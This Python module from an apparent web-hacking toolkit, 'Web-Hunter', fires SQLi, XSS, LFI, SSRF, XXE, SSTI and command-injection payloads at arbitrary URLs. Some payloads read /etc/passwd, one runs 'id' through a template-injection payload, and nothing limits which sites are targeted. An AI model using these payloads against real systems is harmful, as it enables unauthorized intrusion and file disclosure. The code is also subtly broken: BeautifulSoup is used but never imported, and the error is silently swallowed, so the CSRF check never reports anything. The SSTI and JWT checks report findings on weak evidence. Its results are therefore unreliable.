
#!/usr/bin/env python3
"""
Vulnerability scanning module for Web-Hunter
"""

import os
import re
import time
import random
import json
import concurrent.futures
import subprocess
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style
from tqdm import tqdm

from .utils import (
    print_colored, 
    save_to_file, 
    check_command, 
    get_command_output,
    show_progress
)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def scan_sqli(urls, output_dir):
    """Scan URLs for SQL injection vulnerabilities using Ghauri"""
    print_colored("[*] Running SQL Injection Scanner", Fore.BLUE)
    
    sqli_dir = os.path.join(output_dir, "vulnerabilities", "sqli")
    if not os.path.exists(sqli_dir):
        os.makedirs(sqli_dir)
    
    vulnerable_urls = []
    urls_file = os.path.join(sqli_dir, "urls_to_scan.txt")
    
    # Save URLs to a file
    save_to_file(urls, urls_file)
    
    if check_command("ghauri"):
        try:
            # Use Ghauri for SQLi scanning
            cmd = f"ghauri -l {urls_file} --batch --disable-color --timeout 30 --delay 1 --random-agent -v 1"
            output_file = os.path.join(sqli_dir, "ghauri_output.txt")
            
            print_colored("[*] Running Ghauri SQLi scanner...", Fore.BLUE)
            
            with open(output_file, "w") as f:
                process = subprocess.Popen(
                    cmd, 
                    shell=True, 
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                
                for line in process.stdout:
                    f.write(line)
                    if "is vulnerable to SQL injection" in line:
                        url = line.split(" is vulnerable")[0].strip()
                        if url not in vulnerable_urls and url in urls:
                            vulnerable_urls.append(url)
                            print_colored(f"[+] Found SQLi: {url}", Fore.GREEN)
                
                process.wait()
            
            # Save vulnerable URLs
            if vulnerable_urls:
                vuln_file = os.path.join(sqli_dir, "vulnerable_urls.txt")
                save_to_file(vulnerable_urls, vuln_file)
                print_colored(f"[+] Found {len(vulnerable_urls)} URLs vulnerable to SQL injection", Fore.GREEN)
            else:
                print_colored("[-] No SQL injection vulnerabilities found", Fore.YELLOW)
            
            return vulnerable_urls
            
        except Exception as e:
            print_colored(f"[!] Error running SQL injection scan: {str(e)}", Fore.RED)
            return []
    else:
        print_colored("[!] Ghauri not found. Skipping SQL injection scan.", Fore.YELLOW)
        return []

def scan_xss(urls, output_dir):
    """Scan URLs for XSS vulnerabilities"""
    print_colored("[*] Running XSS Scanner", Fore.BLUE)
    
    xss_dir = os.path.join(output_dir, "vulnerabilities", "xss")
    if not os.path.exists(xss_dir):
        os.makedirs(xss_dir)
    
    vulnerable_urls = []
    
    # XSS payloads
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        "<ScRiPt>alert(1)</sCriPt>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<ScRiPt>alert(document.domain)</sCriPt>"
    ]
    
    # Process each URL
    with tqdm(total=len(urls), desc="XSS Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    for param, values in query_params.items():
                        for payload in random.sample(payloads, min(3, len(payloads))):
                            new_params = query_params.copy()
                            new_params[param] = [payload]
                            
                            # Reconstruct URL with payload
                            new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                            test_url = url.replace(parsed_url.query, new_query)
                            
                            try:
                                headers = {'User-Agent': 'Mozilla/5.0'}
                                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                                
                                # Check if payload is reflected
                                if payload in response.text and response.status_code == 200:
                                    if url not in vulnerable_urls:
                                        vulnerable_urls.append(url)
                                        print_colored(f"[+] Potential XSS found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except:
                                # Silently continue on error
                                pass
                
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(xss_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to XSS", Fore.GREEN)
    else:
        print_colored("[-] No XSS vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_rce(urls, output_dir):
    """Scan for RCE vulnerabilities"""
    print_colored("[*] Running RCE Scanner", Fore.BLUE)
    
    rce_dir = os.path.join(output_dir, "vulnerabilities", "rce")
    if not os.path.exists(rce_dir):
        os.makedirs(rce_dir)
    
    vulnerable_urls = []
    
    # Simple RCE test commands
    commands = [
        "sleep 5", 
        "ping -c 4 127.0.0.1"
    ]
    
    # Process each URL
    with tqdm(total=len(urls), desc="RCE Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    for param, values in query_params.items():
                        for cmd in commands:
                            new_params = query_params.copy()
                            new_params[param] = [cmd]
                            
                            # Reconstruct URL with command
                            new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                            test_url = url.replace(parsed_url.query, new_query)
                            
                            try:
                                start_time = time.time()
                                headers = {'User-Agent': 'Mozilla/5.0'}
                                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                                end_time = time.time()
                                
                                # Check for time delay
                                if "sleep" in cmd and (end_time - start_time) > 4.5:
                                    if url not in vulnerable_urls:
                                        vulnerable_urls.append(url)
                                        print_colored(f"[+] Potential RCE found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except requests.exceptions.Timeout:
                                # Timeout might indicate successful RCE with sleep command
                                if "sleep" in cmd and url not in vulnerable_urls:
                                    vulnerable_urls.append(url)
                                    print_colored(f"[+] Potential RCE found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except:
                                # Silently continue on error
                                pass
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(rce_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to RCE", Fore.GREEN)
    else:
        print_colored("[-] No RCE vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_lfi(urls, output_dir):
    """Scan for Local File Inclusion vulnerabilities"""
    print_colored("[*] Running LFI Scanner", Fore.BLUE)
    
    lfi_dir = os.path.join(output_dir, "vulnerabilities", "lfi")
    if not os.path.exists(lfi_dir):
        os.makedirs(lfi_dir)
    
    vulnerable_urls = []
    
    # LFI payloads
    payloads = [
        "../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//....//etc//passwd",
        "/etc/passwd",
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd%00",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    ]
    
    # Process each URL
    with tqdm(total=len(urls), desc="LFI Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    for param, values in query_params.items():
                        for payload in random.sample(payloads, min(3, len(payloads))):
                            new_params = query_params.copy()
                            new_params[param] = [payload]
                            
                            # Reconstruct URL with payload
                            new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                            test_url = url.replace(parsed_url.query, new_query)
                            
                            try:
                                headers = {'User-Agent': 'Mozilla/5.0'}
                                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                                
                                # Check for evidence of successful LFI
                                if any(pattern in response.text for pattern in ["root:x:", "www-data", "nobody:x", "/bin/bash", "/usr/sbin/nologin"]):
                                    if url not in vulnerable_urls:
                                        vulnerable_urls.append(url)
                                        print_colored(f"[+] Potential LFI found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except:
                                # Silently continue on error
                                pass
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(lfi_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to LFI", Fore.GREEN)
    else:
        print_colored("[-] No LFI vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_csrf(urls, output_dir):
    """Scan for CSRF vulnerabilities"""
    print_colored("[*] Running CSRF Scanner", Fore.BLUE)
    
    csrf_dir = os.path.join(output_dir, "vulnerabilities", "csrf")
    if not os.path.exists(csrf_dir):
        os.makedirs(csrf_dir)
    
    vulnerable_urls = []
    
    # Process each URL
    with tqdm(total=len(urls), desc="CSRF Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                if any(keyword in url.lower() for keyword in ["login", "register", "signup", "account", "update", "password", "change", "edit", "profile"]):
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    response = requests.get(url, headers=headers, timeout=10, verify=False)
                    
                    # Check for forms without CSRF tokens
                    if "<form" in response.text.lower():
                        # Check if there's no CSRF token in the form
                        soup = BeautifulSoup(response.text, 'html.parser')
                        forms = soup.find_all('form')
                        
                        has_csrf_token = False
                        for form in forms:
                            inputs = form.find_all('input')
                            for input_field in inputs:
                                field_name = input_field.get('name', '').lower()
                                if any(token_name in field_name for token_name in ["csrf", "token", "nonce", "_token", "authenticity"]):
                                    has_csrf_token = True
                                    break
                        
                        if not has_csrf_token and len(forms) > 0:
                            vulnerable_urls.append(url)
                            print_colored(f"[+] Potential CSRF found: {url}", Fore.GREEN)
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(csrf_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to CSRF", Fore.GREEN)
    else:
        print_colored("[-] No CSRF vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_ssrf(urls, output_dir):
    """Scan for SSRF vulnerabilities"""
    print_colored("[*] Running SSRF Scanner", Fore.BLUE)
    
    ssrf_dir = os.path.join(output_dir, "vulnerabilities", "ssrf")
    if not os.path.exists(ssrf_dir):
        os.makedirs(ssrf_dir)
    
    vulnerable_urls = []
    
    # SSRF payloads
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "file:///etc/passwd",
        "dict://127.0.0.1:22",
        "gopher://127.0.0.1:22/_"
    ]
    
    # Process each URL
    with tqdm(total=len(urls), desc="SSRF Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    for param, values in query_params.items():
                        if any(url_keyword in param.lower() for url_keyword in ["url", "uri", "link", "site", "redirect", "path", "dest", "source", "callback", "return"]):
                            for payload in payloads:
                                new_params = query_params.copy()
                                new_params[param] = [payload]
                                
                                # Reconstruct URL with payload
                                new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                                test_url = url.replace(parsed_url.query, new_query)
                                
                                try:
                                    headers = {'User-Agent': 'Mozilla/5.0'}
                                    response = requests.get(test_url, headers=headers, timeout=10, verify=False, allow_redirects=False)
                                    
                                    # Check for evidence of SSRF
                                    if any(pattern in response.text for pattern in ["root:x:", "private", "localhost", "Internal Server Error", "Service not found"]):
                                        if url not in vulnerable_urls:
                                            vulnerable_urls.append(url)
                                            print_colored(f"[+] Potential SSRF found: {url} (Parameter: {param})", Fore.GREEN)
                                        break
                                except:
                                    # Silently continue on error
                                    pass
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(ssrf_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to SSRF", Fore.GREEN)
    else:
        print_colored("[-] No SSRF vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_idor(urls, output_dir):
    """Scan for IDOR vulnerabilities"""
    print_colored("[*] Running IDOR Scanner", Fore.BLUE)
    
    idor_dir = os.path.join(output_dir, "vulnerabilities", "idor")
    if not os.path.exists(idor_dir):
        os.makedirs(idor_dir)
    
    vulnerable_urls = []
    
    # Process each URL
    with tqdm(total=len(urls), desc="IDOR Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                # Look for numeric IDs in paths or parameters
                parsed_url = urlparse(url)
                path_segments = parsed_url.path.split('/')
                
                # Check path-based IDs
                for i, segment in enumerate(path_segments):
                    if segment.isdigit() and int(segment) > 0:
                        original_id = int(segment)
                        
                        # Test with a different ID
                        new_id = original_id + 1
                        new_path_segments = path_segments.copy()
                        new_path_segments[i] = str(new_id)
                        new_path = "/".join(new_path_segments)
                        
                        new_url = url.replace(parsed_url.path, new_path)
                        
                        try:
                            headers = {'User-Agent': 'Mozilla/5.0'}
                            original_response = requests.get(url, headers=headers, timeout=10, verify=False)
                            new_response = requests.get(new_url, headers=headers, timeout=10, verify=False)
                            
                            # Check if responses are similar but with different IDs
                            if (original_response.status_code == new_response.status_code == 200 and
                                len(original_response.text) > 100 and
                                0.7 <= len(new_response.text) / len(original_response.text) <= 1.3):
                                
                                vulnerable_urls.append(url)
                                print_colored(f"[+] Potential IDOR found: {url} (Path ID: {original_id})", Fore.GREEN)
                                break
                        except:
                            # Silently continue on error
                            pass
                
                # Check query parameters
                query_params = parse_qs(parsed_url.query)
                if query_params:
                    for param, values in query_params.items():
                        if values and values[0].isdigit() and int(values[0]) > 0:
                            original_id = int(values[0])
                            new_id = original_id + 1
                            
                            new_params = query_params.copy()
                            new_params[param] = [str(new_id)]
                            
                            # Reconstruct URL with new ID
                            new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                            new_url = url.replace(parsed_url.query, new_query)
                            
                            try:
                                headers = {'User-Agent': 'Mozilla/5.0'}
                                original_response = requests.get(url, headers=headers, timeout=10, verify=False)
                                new_response = requests.get(new_url, headers=headers, timeout=10, verify=False)
                                
                                # Check if responses are similar but with different IDs
                                if (original_response.status_code == new_response.status_code == 200 and
                                    len(original_response.text) > 100 and
                                    0.7 <= len(new_response.text) / len(original_response.text) <= 1.3):
                                    
                                    vulnerable_urls.append(url)
                                    print_colored(f"[+] Potential IDOR found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except:
                                # Silently continue on error
                                pass
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(idor_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to IDOR", Fore.GREEN)
    else:
        print_colored("[-] No IDOR vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_xxe(urls, output_dir):
    """Scan for XXE vulnerabilities"""
    print_colored("[*] Running XXE Scanner", Fore.BLUE)
    
    xxe_dir = os.path.join(output_dir, "vulnerabilities", "xxe")
    if not os.path.exists(xxe_dir):
        os.makedirs(xxe_dir)
    
    vulnerable_urls = []
    
    # XXE payload
    xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
    xxe_svg_payload = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>"""
    
    # Process each URL
    with tqdm(total=len(urls), desc="XXE Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                # Test for XXE vulnerability by sending XML payload
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Type': 'application/xml'
                }
                
                response = requests.post(url, data=xxe_payload, headers=headers, timeout=10, verify=False)
                
                # Check for evidence of XXE
                if any(pattern in response.text for pattern in ["root:x:", "www-data", "/bin/bash", "/usr/sbin/nologin"]):
                    vulnerable_urls.append(url)
                    print_colored(f"[+] Potential XXE found: {url}", Fore.GREEN)
                    continue
                
                # Try SVG payload
                headers['Content-Type'] = 'image/svg+xml'
                response = requests.post(url, data=xxe_svg_payload, headers=headers, timeout=10, verify=False)
                
                # Check for evidence of XXE
                if any(pattern in response.text for pattern in ["root:x:", "www-data", "/bin/bash", "/usr/sbin/nologin"]):
                    vulnerable_urls.append(url)
                    print_colored(f"[+] Potential XXE found: {url} (SVG)", Fore.GREEN)
                    continue
                
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(xxe_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to XXE", Fore.GREEN)
    else:
        print_colored("[-] No XXE vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_ssti(urls, output_dir):
    """Scan for Server-Side Template Injection vulnerabilities"""
    print_colored("[*] Running SSTI Scanner", Fore.BLUE)
    
    ssti_dir = os.path.join(output_dir, "vulnerabilities", "ssti")
    if not os.path.exists(ssti_dir):
        os.makedirs(ssti_dir)
    
    vulnerable_urls = []
    
    # SSTI payloads for different template engines
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{7*7}",
        "{{'/etc/passwd'|file_exists}}",
        "${T(java.lang.Math).random()*100}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{7*'7'}}"
    ]
    
    # Process each URL
    with tqdm(total=len(urls), desc="SSTI Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                if query_params:
                    for param, values in query_params.items():
                        for payload in random.sample(payloads, min(3, len(payloads))):
                            new_params = query_params.copy()
                            new_params[param] = [payload]
                            
                            # Reconstruct URL with payload
                            new_query = "&".join(f"{p}={v[0]}" for p, v in new_params.items())
                            test_url = url.replace(parsed_url.query, new_query)
                            
                            try:
                                headers = {'User-Agent': 'Mozilla/5.0'}
                                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                                
                                # Check for evidence of SSTI
                                if any(marker in response.text for marker in ["49", "7777777", "uid=", "gid="]):
                                    if url not in vulnerable_urls:
                                        vulnerable_urls.append(url)
                                        print_colored(f"[+] Potential SSTI found: {url} (Parameter: {param})", Fore.GREEN)
                                    break
                            except:
                                # Silently continue on error
                                pass
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(ssti_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs potentially vulnerable to SSTI", Fore.GREEN)
    else:
        print_colored("[-] No SSTI vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_jwt(urls, output_dir):
    """Scan for JWT vulnerabilities"""
    print_colored("[*] Running JWT Vulnerability Scanner", Fore.BLUE)
    
    jwt_dir = os.path.join(output_dir, "vulnerabilities", "jwt")
    if not os.path.exists(jwt_dir):
        os.makedirs(jwt_dir)
    
    vulnerable_urls = []
    
    # Process each URL
    with tqdm(total=len(urls), desc="JWT Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = requests.get(url, headers=headers, timeout=10, verify=False)
                
                # Check for JWT in response headers
                jwt_found = False
                for header, value in response.headers.items():
                    if "jwt" in header.lower() or (header.lower() in ["authorization", "set-cookie"] and "eyJ" in value):
                        jwt_found = True
                        jwt_token = value.replace("Bearer ", "")
                        if "." in jwt_token:
                            parts = jwt_token.split(".")
                            if len(parts) == 3:
                                # This is a simple check - in real scenarios, you'd need more sophisticated testing
                                vulnerable_urls.append(url)
                                print_colored(f"[+] JWT token found in {header}: {url}", Fore.GREEN)
                                break
                
                # Check for JWT in response body
                if not jwt_found and "eyJ" in response.text:
                    # Try to extract a JWT token from the body
                    jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
                    matches = re.findall(jwt_pattern, response.text)
                    if matches:
                        vulnerable_urls.append(url)
                        print_colored(f"[+] JWT token found in response body: {url}", Fore.GREEN)
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(jwt_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs with JWT tokens", Fore.GREEN)
    else:
        print_colored("[-] No JWT tokens found", Fore.YELLOW)
    
    return vulnerable_urls

def scan_broken_auth(urls, output_dir):
    """Scan for broken authentication vulnerabilities"""
    print_colored("[*] Running Broken Authentication Scanner", Fore.BLUE)
    
    auth_dir = os.path.join(output_dir, "vulnerabilities", "broken_auth")
    if not os.path.exists(auth_dir):
        os.makedirs(auth_dir)
    
    vulnerable_urls = []
    
    # Process each URL
    with tqdm(total=len(urls), desc="Auth Scanning", bar_format="{desc}: {percentage:3.0f}% |{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as progress_bar:
        for url in urls:
            try:
                # Check for login pages
                if any(keyword in url.lower() for keyword in ["login", "signin", "auth", "authenticate", "account"]):
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    response = requests.get(url, headers=headers, timeout=10, verify=False)
                    
                    # Check for lack of rate limiting by trying multiple rapid requests
                    for _ in range(5):
                        requests.get(url, headers=headers, timeout=5, verify=False)
                    
                    # Check for login form without proper security headers
                    if "<form" in response.text.lower() and "password" in response.text.lower():
                        headers_to_check = ["Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
                        missing_headers = [header for header in headers_to_check if header not in response.headers]
                        
                        if missing_headers:
                            vulnerable_urls.append(url)
                            print_colored(f"[+] Login form with missing security headers: {url}", Fore.GREEN)
                            print_colored(f"    Missing: {', '.join(missing_headers)}", Fore.YELLOW)
                            continue
                    
                    # Check for HTTP (non-HTTPS) login forms
                    if url.startswith("http:") and not url.startswith("https:"):
                        if "<form" in response.text.lower() and "password" in response.text.lower():
                            vulnerable_urls.append(url)
                            print_colored(f"[+] HTTP (non-HTTPS) login form: {url}", Fore.GREEN)
                            continue
            except:
                # Silently continue on error
                pass
            
            progress_bar.update(1)
    
    # Save vulnerable URLs
    if vulnerable_urls:
        vuln_file = os.path.join(auth_dir, "vulnerable_urls.txt")
        save_to_file(vulnerable_urls, vuln_file)
        print_colored(f"[+] Found {len(vulnerable_urls)} URLs with potential broken authentication", Fore.GREEN)
    else:
        print_colored("[-] No broken authentication vulnerabilities found", Fore.YELLOW)
    
    return vulnerable_urls

def run_nuclei_scan(urls, output_dir):
    """Run Nuclei vulnerability scanner"""
    print_colored("[*] Running Nuclei vulnerability scanner", Fore.BLUE)
    
    nuclei_dir = os.path.join(output_dir, "vulnerabilities", "nuclei")
    if not os.path.exists(nuclei_dir):
        os.makedirs(nuclei_dir)
    
    # Save URLs to a file
    urls_file = os.path.join(nuclei_dir, "urls_to_scan.txt")
    save_to_file(urls, urls_file)
    
    # Check if Nuclei is installed
    if check_command("nuclei"):
        try:
            # Run Nuclei
            output_file = os.path.join(nuclei_dir, "nuclei_results.json")
            cmd = f"nuclei -l {urls_file} -o {output_file} -silent -severity critical,high,medium -json"
            
            print_colored("[*] Running Nuclei scanner...", Fore.BLUE)
            
            # Run the command and capture output
            result = get_command_output(cmd)
            
            if os.path.exists(output_file):
                # Parse the results
                vulnerabilities = {}
                with open(output_file, 'r') as f:
                    for line in f:
                        try:
                            finding = json.loads(line.strip())
                            template_id = finding.get("template-id", "unknown")
                            if template_id not in vulnerabilities:
                                vulnerabilities[template_id] = []
                            vulnerabilities[template_id].append(finding.get("matched-at", ""))
                        except:
                            continue
                
                # Generate a summary
                summary_file = os.path.join(nuclei_dir, "nuclei_summary.txt")
                with open(summary_file, 'w') as f:
                    f.write("Nuclei Vulnerability Summary\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for template_id, urls in vulnerabilities.items():
                        f.write(f"{template_id}: {len(urls)}\n")
                        for url in urls:
                            f.write(f"  - {url}\n")
                        f.write("\n")
                
                print_colored(f"[+] Nuclei scan completed. Found vulnerabilities for {len(vulnerabilities)} templates.", Fore.GREEN)
                for template_id, urls in vulnerabilities.items():
                    print_colored(f"    {template_id}: {len(urls)} URLs", Fore.YELLOW)
                
                return vulnerabilities
            else:
                print_colored("[-] No results from Nuclei scan", Fore.YELLOW)
                return {}
        except Exception as e:
            print_colored(f"[!] Error running Nuclei scan: {str(e)}", Fore.RED)
            return {}
    else:
        print_colored("[!] Nuclei not found. Skipping scan.", Fore.YELLOW)
        return {}

def run_vulnerability_scan(urls, output_dir):
    """Run comprehensive vulnerability scan on provided URLs"""
    print_colored("[*] Running comprehensive vulnerability scans", Fore.BLUE)
    
    vuln_dir = os.path.join(output_dir, "vulnerabilities")
    if not os.path.exists(vuln_dir):
        os.makedirs(vuln_dir)
    
    # Save URLs to scan
    urls_file = os.path.join(vuln_dir, "urls_to_scan.txt")
    save_to_file(urls, urls_file)
    
    # Randomize URL order for better scan distribution
    random.shuffle(urls)
    
    # Priority vulnerabilities to scan
    scan_sqli(urls, output_dir)
    scan_xss(urls, output_dir)
    scan_lfi(urls, output_dir)
    scan_rce(urls, output_dir)
    
    # Ask user if they want to continue with other scans
    print_colored("\n[?] Continue with additional vulnerability scans? (y/n)", Fore.YELLOW)
    choice = input(f"{Fore.YELLOW}❯{Style.RESET_ALL} ")
    
    if choice.lower() in ['y', 'yes']:
        scan_ssrf(urls, output_dir)
        scan_idor(urls, output_dir)
        scan_ssti(urls, output_dir)
        scan_xxe(urls, output_dir)
        scan_jwt(urls, output_dir)
        scan_broken_auth(urls, output_dir)
        scan_csrf(urls, output_dir)
        
        # Ask for Nuclei scan
        print_colored("\n[?] Run Nuclei vulnerability scanner? (y/n)", Fore.YELLOW)
        nuclei_choice = input(f"{Fore.YELLOW}❯{Style.RESET_ALL} ")
        
        if nuclei_choice.lower() in ['y', 'yes']:
            run_nuclei_scan(urls, output_dir)
    
    print_colored(f"\n[+] Vulnerability scanning completed. Results saved to {vuln_dir}", Fore.GREEN)
